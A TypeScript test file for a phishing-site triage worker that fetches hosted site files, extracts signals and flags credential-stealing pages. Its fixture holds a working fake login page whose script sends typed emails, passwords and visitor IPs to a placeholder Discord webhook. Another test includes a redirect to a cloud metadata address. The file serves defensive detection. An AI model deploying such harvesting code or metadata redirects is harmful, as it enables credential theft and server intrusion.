import { describe, expect, test } from 'bun:test'
import { fetchSite, isSafePath, planFiles, readFile, SITE_LIMITS, shortUrl } from './site-files'
import type { ModerationStore } from './store'
import { type Classifier, createTriageWorker } from './triage'
import type { Triage } from './types'

const DID = 'did:plc:pppppppppppppppppppppppp'
const BASE = `https://sites.wisp.place/${DID}/site/`

// Shaped like the 2026-11-16 kit: a brand login page whose script posts what is typed
// to a chat webhook. The webhook is not a real one.
const PHISH = `<!doctype html><html><head><title>Acme Mail - Sign in</title></head><body>
<h2>Log in to Acme Mail</h2>
<form id="login"><input type="email" id="email"><input type="password" id="password"><button>Log in</button></form>
<script>
const HOOK = 'https://discord.com/api/webhooks/000000000000000000/not-a-real-token-not-a-real-token';
document.getElementById('password').addEventListener('keydown', () => {});
document.getElementById('login').addEventListener('submit', async (e) => {
	e.preventDefault();
	const ip = await (await fetch('https://api.ipify.org?format=json')).json();
	await fetch(HOOK, { method: 'POST', body: JSON.stringify({ email: email.value, password: password.value, ip }) });
	location.href = 'https://mail.acme.example/';
});
</script></body></html>`

const BENIGN: Record<string, string> = {
	'/': '<title>Robin</title><h1>hi, I am Robin</h1><a href="about.html">about</a><script src="app.js"></script>',
	'about.html': '<title>About</title><p>I draw birds.</p><a href="https://github.com/robin">github</a>',
	'blog/2026/first.html': '<title>First post</title><p>Hello world, my first post.</p>',
	'app.js': "fetch('posts.json').then((r) => r.json()).then(console.log)",
	'style.css': 'body { color: rebeccapurple }',
}

type Saved = { uri: string; triage: Triage; facts: unknown }

/** One pending site at the store boundary; records what the worker saves or defers. */
function fakeStore(paths: string[]) {
	const saved: Saved[] = []
	const deferred: number[] = []
	let attempts = 0
	let done = false
	const store = {
		nextPending: async () =>
			done
				? null
				: {
						uri: `at://${DID}/place.wisp.fs/site`,
						did: DID,
						rkey: 'site',
						handle: '',
						files: paths.length,
						paths,
						attempts,
					},
		deferTriage: async (_uri: string, next: number) => {
			deferred.push(next)
			attempts = next
		},
		saveTriage: async (uri: string, triage: Triage, facts: unknown) => {
			saved.push({ uri, triage, facts })
			done = true
		},
	} as unknown as ModerationStore
	return { store, saved, deferred }
}

/** The shared host, answering from a path -> body map; everything else is a 404. */
function host(pages: Record<string, string | Response>) {
	const urls: string[] = []
	const fetchImpl = (async (input: string | URL) => {
		const url = String(input)
		urls.push(url)
		if (!url.startsWith(BASE)) return new Response('wrong host', { status: 599 })
		const path = decodeURIComponent(url.slice(BASE.length)) || '/'
		const page = pages[path]
		if (page instanceof Response) return page
		if (page === undefined) return new Response('not found', { status: 404 })
		const type = path.endsWith('.js') ? 'text/javascript' : path.endsWith('.css') ? 'text/css' : 'text/html'
		return new Response(page, { headers: { 'content-type': type } })
	}) as unknown as typeof fetch
	return { fetchImpl, urls }
}

function classifier(answer: Omit<Triage, 'at' | 'model'>) {
	const seen: string[] = []
	const classify: Classifier = async (description) => {
		seen.push(description)
		return answer
	}
	return { classify, seen }
}

const fine = { flag: false, category: 'none', reason: 'a personal site', confidence: 0.8, files: [] }

describe('site files', () => {
	test('planFiles reads pages first, skips binaries and paths that would leave the site', () => {
		const plan = planFiles(
			[
				'img/cat.png',
				'style.css',
				'docs/deep/page.html',
				'app.js',
				'about.html',
				'x/../../other/index.html',
				'setup.exe',
			],
			10,
		)
		expect(plan).toEqual(['about.html', 'docs/deep/page.html', 'app.js', 'style.css'])
		expect(isSafePath('a/./b.html')).toBe(false)
		expect(isSafePath('a//b.html')).toBe(false)
		expect(isSafePath('a\\b.html')).toBe(false)
	})

	test('a login-looking page outranks shallower ones', () => {
		expect(planFiles(['a/b.html', 'a/b/c/verify-account.html', 'z.html'], 2)).toEqual([
			'z.html',
			'a/b/c/verify-account.html',
		])
	})

	test('shortUrl keeps the host and drops tokens, ids and queries', () => {
		expect(shortUrl('https://discord.com/api/webhooks/000000000000000000/not-a-real-token-not-a-real-token')).toBe(
			'discord.com/api/webhooks/…/…',
		)
		expect(shortUrl('https://api.ipify.org?format=json')).toBe('api.ipify.org')
	})

	test('readFile finds the credential form, the webhook and the sends', () => {
		const f = readFile(
			{
				path: 'mail/login.html',
				status: 200,
				contentType: 'text/html',
				body: PHISH,
				bytes: PHISH.length,
				truncated: false,
			},
			'sites.wisp.place',
			3000,
		)
		expect(f.forms).toEqual([{ action: '', method: 'get', inputs: ['email:email', 'password:password'] }])
		expect(f.signals).toEqual(
			expect.arrayContaining([
				'password field',
				'webhook or bot endpoint',
				'sends data',
				'captures keystrokes',
				'looks up visitor IP',
			]),
		)
		expect(f.urls).toContain('discord.com/api/webhooks/…/…')
		expect(f.urls.join(' ')).not.toContain('not-a-real-token')
	})

	test('hostile markup (unclosed tags over 512 KiB) is read in linear time', () => {
		const n = 512 * 1024
		for (const body of [
			'<script>'.repeat(n / 8),
			'<form '.repeat(n / 6),
			`<form>${'<input '.repeat(n / 7)}`,
			'<'.repeat(n),
		]) {
			const t = performance.now()
			readFile({ path: 'x.html', status: 200, contentType: 'text/html', body, bytes: n, truncated: false }, 'h', 100)
			expect(performance.now() - t).toBeLessThan(1000)
		}
	})

	test('characters whose lower case is longer do not shift what is read', () => {
		const body = `${'İ'.repeat(50)}<title>Real</title><form action="https://x.example/p"><input type=password name=p></form>`
		const f = readFile(
			{ path: 'a.html', status: 200, contentType: 'text/html', body, bytes: 1, truncated: false },
			'h',
			100,
		)
		expect(f.title).toBe('Real')
		expect(f.forms).toEqual([{ action: 'https://x.example/p', method: 'get', inputs: ['p:password'] }])
	})

	test('redirects are followed inside the site only', async () => {
		const { fetchImpl, urls } = host({
			'/': new Response(null, { status: 302, headers: { location: `${BASE}home.html` } }),
			'home.html': '<p>home</p>',
			'go.html': new Response(null, { status: 301, headers: { location: 'http://169.254.169.254/latest/meta-data' } }),
		})
		const files = await fetchSite(BASE, ['go.html'], { fetchImpl })
		expect(files[0]).toMatchObject({ path: '/', status: 200, body: '<p>home</p>' })
		expect(files[1]).toMatchObject({
			path: 'go.html',
			status: 301,
			error: 'redirect',
			redirect: '169.254.169.254/latest/meta-data',
		})
		expect(urls.some((u) => u.includes('169.254'))).toBe(false)
		expect(readFile(files[1] as never, 'sites.wisp.place', 100).signals).toContain('redirects off-site')
	})

	test('bounds: file count, bytes per file and in total', async () => {
		const big = `<p>${'spam '.repeat(40_000)}</p>`
		const pages = Object.fromEntries(Array.from({ length: 40 }, (_, i) => [`p${String(i).padStart(2, '0')}.html`, big]))
		const { fetchImpl, urls } = host({ '/': big, ...pages })
		const limits = { ...SITE_LIMITS, files: 10, rootBytes: 64 * 1024, fileBytes: 32 * 1024, totalBytes: 200 * 1024 }
		const files = await fetchSite(BASE, Object.keys(pages), { fetchImpl, limits })
		expect(files).toHaveLength(11)
		expect(urls.length).toBeLessThanOrEqual(11)
		expect(files[0]?.bytes).toBe(64 * 1024)
		expect(files.slice(1).every((f) => f.bytes <= 32 * 1024)).toBe(true)
		expect(files.reduce((n, f) => n + f.bytes, 0)).toBeLessThanOrEqual(200 * 1024)
		expect(files.filter((f) => f.error === 'budget').length).toBeGreaterThan(0)
	})
})

describe('triage worker', () => {
	test('a root 404 with a nested phishing page goes to the model with that page, and is flagged', async () => {
		const paths = ['assets/logo.png', 'mail/verify/login.html']
		const { store, saved, deferred } = fakeStore(paths)
		const { fetchImpl, urls } = host({ 'mail/verify/login.html': PHISH })
		const model = classifier({
			flag: true,
			category: 'phishing',
			reason: 'fake Acme Mail login posting credentials to a webhook',
			confidence: 0.95,
			files: ['/mail/verify/login.html'],
		})
		await createTriageWorker({ store, model: 'test-model', fetchImpl, classify: model.classify }).drain()
		expect(deferred).toEqual([])
		expect(urls.every((u) => u.startsWith(BASE))).toBe(true)
		expect(urls).not.toContain(`${BASE}assets/logo.png`)
		const description = model.seen[0] ?? ''
		expect(description).toContain('== mail/verify/login.html')
		expect(description).toContain('Not read: / (404)')
		expect(description).toContain('password field')
		expect(description).toContain('discord.com/api/webhooks/…')
		expect(description).toContain('inputs email:email, password:password')
		expect(description).not.toContain('not-a-real-token')
		expect(saved[0]?.triage).toMatchObject({ flag: true, category: 'phishing', files: ['mail/verify/login.html'] })
		expect(saved[0]?.triage.reason).toStartWith('mail/verify/login.html: ')
		expect(saved[0]?.facts).toMatchObject({ title: 'Acme Mail - Sign in' })
	})

	test('the credential-to-webhook shape flags the site even when the model lets it through', async () => {
		const { store, saved } = fakeStore(['mail/verify/login.html'])
		const { fetchImpl } = host({ 'mail/verify/login.html': PHISH })
		await createTriageWorker({ store, model: 'test-model', fetchImpl, classify: classifier(fine).classify }).drain()
		expect(saved[0]?.triage).toMatchObject({ flag: true, category: 'phishing', model: 'test-model' })
		expect(saved[0]?.triage.reason).toStartWith('rules: mail/verify/login.html ask for a password')
	})

	test('when the model is down, the same shape is flagged by the rule instead of waiting', async () => {
		const { store, saved, deferred } = fakeStore(['mail/verify/login.html'])
		const { fetchImpl } = host({ 'mail/verify/login.html': PHISH })
		const classify: Classifier = async () => {
			throw new Error('model answered 503')
		}
		await createTriageWorker({ store, model: 'test-model', fetchImpl, classify }).drain()
		expect(deferred).toEqual([])
		expect(saved[0]?.triage).toMatchObject({ flag: true, model: 'rules', files: ['mail/verify/login.html'] })
	})

	test('a benign multi-file site is read across its pages and stays clear', async () => {
		const paths = ['about.html', 'app.js', 'blog/2026/first.html', 'img/cat.png', 'index.html', 'style.css']
		const { store, saved } = fakeStore(paths)
		const { fetchImpl, urls } = host(BENIGN)
		const model = classifier(fine)
		await createTriageWorker({ store, model: 'test-model', fetchImpl, classify: model.classify }).drain()
		// `/` answered, so the top-level index.html is not fetched twice; the image is never fetched
		expect(urls.map((u) => u.slice(BASE.length)).sort()).toEqual([
			'',
			'about.html',
			'app.js',
			'blog/2026/first.html',
			'style.css',
		])
		const description = model.seen[0] ?? ''
		for (const p of ['== /', '== about.html', '== blog/2026/first.html', '== app.js', '== style.css'])
			expect(description).toContain(p)
		expect(description).toContain('img/cat.png')
		expect(saved[0]?.triage).toMatchObject({ flag: false, category: 'none' })
		expect(saved[0]?.triage.reason).toBe('/, about.html, blog/2026/first.html: a personal site')
		expect(saved[0]?.facts).toMatchObject({ title: 'Robin', outbound: ['github.com'] })
	})

	test('the description stays within its budget on a large site', async () => {
		const pages = Object.fromEntries(
			Array.from({ length: 300 }, (_, i) => [`docs/page-${i}.html`, `<p>${'documentation '.repeat(2000)}</p>`]),
		)
		const { store } = fakeStore(Object.keys(pages))
		const { fetchImpl, urls } = host(pages)
		const model = classifier(fine)
		await createTriageWorker({ store, model: 'test-model', fetchImpl, classify: model.classify }).drain()
		expect(urls.length).toBe(1 + SITE_LIMITS.files)
		expect((model.seen[0] ?? '').length).toBeLessThanOrEqual(SITE_LIMITS.descriptionChars + 100)
		expect(model.seen[0]).toContain('(+220 more)')
	})

	test('a site where nothing answers is retried, then cleared naming the files', async () => {
		const { store, saved, deferred } = fakeStore(['index.html', 'a.html'])
		const { fetchImpl } = host({ '/': new Response('', { status: 503 }), 'a.html': new Response('', { status: 503 }) })
		const w = createTriageWorker({ store, model: 'test-model', fetchImpl, classify: classifier(fine).classify })
		for (let i = 0; i < 4; i++) await w.step()
		expect(deferred).toEqual([1, 2, 3])
		expect(saved[0]?.triage).toMatchObject({
			flag: false,
			model: 'none',
			reason: 'no file answered: / 503, a.html 503, index.html 404',
		})
	})
})
